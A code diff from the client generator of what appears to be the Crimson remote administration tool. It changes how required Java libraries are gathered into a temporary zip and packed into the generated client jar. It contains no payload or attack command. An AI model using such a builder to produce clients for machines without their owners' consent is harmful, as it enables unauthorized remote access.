@@ -27,6 +27,7 @@ import org.slf4j.LoggerFactory;
 import org.zeroturnaround.zip.ZipUtil;
 
 import com.subterranean_security.crimson.core.Common;
+import com.subterranean_security.crimson.core.Common.Instance;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.storage.ClientDB;
@@ -117,9 +118,20 @@ public class Generator {
 		// add client database to jar
 		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/res/bin/client.db", clientDB);
 
-		// add libraries to jar // TODO only copy needed libs
-		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/res/bin/lib.zip",
-				new File(Common.Directories.base.getAbsolutePath() + "/lib/lib.zip"));
+		// add libraries to jar
+		File tmpZip = new File(temp.getAbsolutePath() + "/clib.zip");
+		tmpZip.mkdir();
+
+		for (String lib : CUtil.Libraries.getRequisites(Instance.CLIENT)) {
+			// ZipUtil.addEntry(tmpZip, lib + ".jar",
+			// new File(Common.Directories.base.getAbsolutePath() + "/lib/java/"
+			// + lib + ".jar"));
+			CUtil.Files.copyFile(new File(Common.Directories.base.getAbsolutePath() + "/lib/java/" + lib + ".jar"),
+					new File(tmpZip.getAbsolutePath() + "/" + lib + ".jar"));
+
+		}
+		ZipUtil.unexplode(tmpZip);
+		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/res/bin/lib.zip", tmpZip);
 
 		// create and add the internal.txt
 		internal.createNewFile();
